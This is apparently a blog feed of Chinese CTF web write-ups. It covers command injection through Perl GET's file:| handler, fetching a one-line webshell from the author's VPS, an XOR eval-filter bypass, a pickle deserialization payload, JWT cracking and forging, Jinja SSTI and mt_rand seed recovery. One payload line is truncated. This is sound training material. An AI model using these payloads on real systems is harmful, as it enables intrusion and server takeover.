    <content><![CDATA[<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    @chdir(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = shell_exec(<span class="string">&quot;GET &quot;</span> . escapeshellarg(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    <span class="variable">$info</span> = pathinfo(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    <span class="variable">$dir</span>  = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, basename(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @mkdir(<span class="variable">$dir</span>);</span><br><span class="line">    @chdir(<span class="variable">$dir</span>);</span><br><span class="line">    @file_put_contents(basename(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>收件创建了一个沙盒，路径可以通过上面来计算出来</p>
<p>然后就是file_put_contents写入了，用GET,完全不知道是什么命令，先往下看看</p>
<p>有个pathinfo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pathinfo(path,options) 函数以数组的形式返回关于文件路径的信息。</span><br><span class="line"></span><br><span class="line">返回的数组元素如下：</span><br><span class="line">[dirname]: 目录路径</span><br><span class="line">[basename]: 文件名</span><br><span class="line">[extension]: 文件后缀名</span><br><span class="line">[filename]: 不包含后缀的文件名</span><br></pre></td></tr></table></figure>

<p>也就是说我们可以传入一个路径然后将shellexec读取到的内容传入我们设置的路径中这里有个点，当我们只传入一个文件名的时候，它的dirname是当前路径</p>
<p>也就是说我们直接构造文件就可以在当前的沙盒目录写入文件</p>
<p>现在回来看看GET是perl脚本中的命令，查到了有关GET的使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / 列出根目录的内容</span><br><span class="line">GET /root/1.txt 读取1.txt中的内容</span><br></pre></td></tr></table></figure>

<p>这样的话我们可以先看看根目录下的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=/&amp;filename=aaa</span><br></pre></td></tr></table></figure>

<p>这样就将根目录显示到了沙盒下的aaa文件中</p>
<p>我们直接打开这个文件查看一下</p>
<p><img src="/2022/04/06/SSRFMe/1.png" alt="1"></p>
<p>发现两个文件，一般来说就是运行这个readflag这个elf文件了，但是不死心，还是想看一下flag文件</p>
<p>回显是空</p>
<p>还是得想想办法运行readflag文件</p>
<p>他应该是一个具有S权限的读取flag程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s权限：设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份</span><br></pre></td></tr></table></figure>



<p>查了一下发现</p>
<p>GET 命令还包含了file而这个函数调用了open函数，而这个open存在一个命令执行，如果我们执行的命令存在，那么就执行这个命令，因为这个path可控，是我们输入的命令，那么我们直接利用<code>file:|./readflag</code>这样就可以执行这个文件了</p>
<p>再自己的虚拟机里面测试了一下：</p>
<p><img src="/2022/04/06/SSRFMe/2.png" alt="1"></p>
<p>需要先让这个文件存在那么我们直接将filename给一个|/readflag</p>
<p>现在这创建一个文件，让文件存在</p>
<p>然后再运行payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=aaa&amp;filename=file:|/readflag</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/06/SSRFMe/3.png" alt="1"></p>
<p>拿到flag</p>
<p>还有第二种方法</p>
<p>因为它模拟的是http的get</p>
<p>那么也就是说我们可以直接再我们的文件里面写入公网的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=www.baidu.com&amp;filename=777</span><br></pre></td></tr></table></figure>

<p>访问发现：</p>
<p><img src="/2022/04/06/SSRFMe/4.png" alt="1"></p>
<p>确实写入了文件</p>
<p>那么我们可以直接写入一句话文本然后用php来对他进行解析，这样就可以直接写入一句话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=vps-ip/aaa.txt&amp;filename=abc.php</span><br></pre></td></tr></table></figure>

<p>这样就能再abc中写入aaa里面的一句话木马了，然后直接蚁剑链接执行readflag就行</p>
]]></content>
      <tags>
        <tag>HITCON2017</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF2019-EasyWeb</title>
    <url>/2022/04/08/SUCTF2019-EasyWeb/</url>
    <content><![CDATA[<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>题目给了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>给了一个函数，给了一个传参点：</p>
<p>有一层waf要过滤，先看看有什么能用的</p>
<p>除去不可见字符之外还有这些<code>! # $ % ( ) * + - / : ; &lt; &gt; ? @ \ ] ^ &#123; &#125;</code></p>
<p>发现没有过滤异或，想办法构造一个异或来执行命令，因为设置的长度，所以可以直接构造一个<code>_GET</code></p>
<p>因为没有[所以我们需要构造{_GET}{参数}的形式就行可以直接挑一个不可见字符构造就行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$x</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">255</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$k</span> = chr(<span class="variable">$j</span>) ^ chr(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$k</span> == <span class="variable">$x</span>[<span class="variable">$i</span>]) &#123;</span><br><span class="line">            <span class="variable">$payload</span> .= <span class="string">&#x27;%&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;%ff%ff%ff%ff^&#x27;</span>.<span class="variable">$payload</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我挑的是%FF因为他设置了类型限制，只能由12个不同字符，所以我们构造传入参数的时候可以直接用前面的已有符号进行构造</p>
<p>payload:`?_=$</p>
]]></content>
      <tags>
        <tag>SUCTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>ikun</title>
    <url>/2022/04/05/ikun/</url>
    <content><![CDATA[<p>先注册登录进去看看</p>
<p>进入题目让找到买到lv6，所以第一步是找到lv6的页面写个脚本查一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">502</span>):</span><br><span class="line">	url = <span class="string">&#x27;http://0a865d2d-fba3-4285-b617-a797f62eabb2.node4.buuoj.cn:81/shop?page=&#x27;</span></span><br><span class="line">	io = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> io.text:</span><br><span class="line">		<span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<p>发现在181页的第一个，但是看了一眼我账号里面的钱，完全不够，抓个包看一下把</p>
<p><img src="/2022/04/05/ikun/2.png" alt="1"></p>
<p>发现他把价格跟</p>
<p>折扣以post方式传过去的，可以改一下这个折扣改到无穷小（试过了修改价格，没用）</p>
<p>购买成功之后弹出一个网页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Location: /b1g_m4mber</span><br></pre></td></tr></table></figure>

<p>访问这个页面发现只有admin用户才能访问</p>
<p>仔细一看他的cookie有一项jwt可以知道他是jwt，我们需要知道他的secret才能修改用户</p>
<p>利用这个工具找到他的secret<a class="link" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker<i class="fas fa-external-link-alt"></i></a></p>
<p>解析之后发现他的secret是<code>1Kun</code></p>
<p>知道了secret可以去这个网站修改一下<a class="link" href="https://jwt.io/">https://jwt.io/<i class="fas fa-external-link-alt"></i></a></p>
<p>然后就可以以admin访问了，然后发现页面也没有什么有用的内容，但是在页面源码里面它藏了zip</p>
<p>下载下来就可以看到他的源码了</p>
<p>审计一下源码发现在admin.py中隐藏了反序列化漏洞：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>在我们以admin用户访问页面的时候他的become是admin，可以看到<code>   p = pickle.loads(urllib.unquote(become))</code>这里对become进行了一次反序列话</p>
<p>而且没有任何的过滤，我们可以构造脚本直接读取里面的内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps：</span><br><span class="line">因为一直做不出来，去网上找了找大佬的文章，这里需要用python2来运行，因为pyton3跟python2运用的协议不同，所以结果也不同	不得不说真是太强辣</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/05/ikun/4.png" alt="1"></p>
<p>拿到flag</p>
]]></content>
      <tags>
        <tag>CISCN2019</tag>
      </tags>
  </entry>
  <entry>
    <title>shrine</title>
    <url>/2022/04/04/shrine/</url>
    <content><![CDATA[<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>题目给出了源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>注册了一个名为FLAG的config，将flag存放在了里面，一般来说如果之后这个的话我们直接查看config就可以直接看到所有app.config的内容，但是这里下面把config给ban了，她会直接替换成None。如果没有过滤self的话，那么self也可以一步步拿到flag</p>
<p>需要调用一些沙盒逃逸的方法来调用里面的禁用函数，需要找出哪些内置函数里面有current_app,current_app里面拥有应用的所有环境，可以在这里面运用config[‘FLAG’]来调用到flag</p>
<p>有一种方法就是用user_for在这个里面可以找到current_app</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config(&#x27;FLAG&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/04/shrine/1.png" alt="1"></p>
<p>拿到app的所有环境就可以调用里面的config[‘FLAG’]来调出flag</p>
<p>tips：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果在ssti过程中，过滤了大部分的类，可以从下面的类中找找办法</span><br><span class="line">url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config,self</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>westernCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>watevrCTF-2019-Cookie Store</title>
    <url>/2022/04/07/watevrCTF-2019-Cookie-Store/</url>
    <content><![CDATA[<p>进入题目直接就是一个购买网页，让我们购买到价值$100的flag，但是我们的钱只有50，直接点击购买并且抓包：</p>
<p><img src="/2022/04/07/watevrCTF-2019-Cookie-Store/1.png" alt="1"></p>
<p>可以看到在session中藏了一段base64编码（其实也就是jwt的头），解析之后看到money</p>
<p><img src="/2022/04/07/watevrCTF-2019-Cookie-Store/2.png" alt="1"></p>
<p>那么也就是说我们只需要把money改成100然后让他执行就行，直接拿到jwt.io里面去更改一下：</p>
<p><img src="/2022/04/07/watevrCTF-2019-Cookie-Store/3.png" alt="1"></p>
<p>注意：这其实是一段base64编码，而他的字符数只有54是不够最后一组的，所以我们在最后的时候需要加上==让他能够杯base64解码解析</p>
<p><img src="/2022/04/07/watevrCTF-2019-Cookie-Store/4.png" alt="1"></p>
<p>返回了一段base64编码内容，直接解析，拿到flag</p>
]]></content>
      <tags>
        <tag>wateverCTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title>枯燥的抽奖</title>
    <url>/2022/04/05/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/</url>
    <content><![CDATA[<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>哈哈哈，进行枯燥无味的抽奖</p>
<p>看了一下源码：</p>
<p><img src="/2022/04/05/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/1.png" alt="1"></p>
<p>直接访问check.php页面看到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>发现他是用mt_rand生成了一个随机数，但是这个函数其实是有问题的，mt_rand是一个伪随机数测试一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">123</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">1495656191</span>&lt;/br&gt;<span class="number">1531059894</span>&lt;/br&gt;<span class="number">614479551</span>&lt;/br&gt;<span class="number">920134305</span>&lt;/br&gt;<span class="number">487159790</span>&lt;/br&gt;<span class="number">1483663921</span>&lt;/br&gt;<span class="number">1183939443</span>&lt;/br&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到只要我们的123没有变化，他生成的这个随机数，都是一样的，完全的没有变化</p>
<p>所以就可以通过一种工具来找到他的key，利用到一个工具<code>php_mt_seed</code>可以通过一种爆破的手段来拿到他的种子</p>
<p>他给了我们其中的10个字符，我们可以用它来恢复全部的字符串</p>
<p>先将他返回成这个软件能够识别的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个参数</span><br><span class="line">当只有一个参数的时候，这个参数代表mt_rand第一次输出的值。</span><br><span class="line"></span><br><span class="line">两个参数</span><br><span class="line">当有两个参数的时候，他们代表mt_rand第一次输出应该位于什么区间内。</span><br><span class="line"></span><br><span class="line">第一个参数为最小值，第二个参数为最大值。</span><br><span class="line"></span><br><span class="line">四个参数（高级模式）</span><br><span class="line">前两个参数表示mt_rand第一次输出的区间，后两个参数表示mt_rand输出的区间。</span><br><span class="line"></span><br><span class="line">多于五个参数（高级模式）</span><br><span class="line">每四个参数一组，但是最后一组可以是1，2或4个参数。每一组引用对应的输出。</span><br></pre></td></tr></table></figure>

<p>我们多余五个参数所以得分成四个一组</p>
<p>附上脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 =<span class="string">&#x27;yasYsCdMgm&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>然后把它恢复的值直接拿到php_mt_seed里面来计算他的种子就行，有的时候有可能不止一个种子，可能需要尝试</p>
<p><img src="/2022/04/05/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/2.png" alt="1"></p>
<p>要用这个7.1以上的版本</p>
<p>然后将这个丢进原来页面的脚本去跑一下输出一下截断之前的值</p>
<p><img src="/2022/04/05/%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/3.png" alt="1"></p>
<p>然后把下面的整个拿去guess就能拿到flag</p>
]]></content>
      <tags>
        <tag>GWCTF2019</tag>
      </tags>
  </entry>
  <entry>
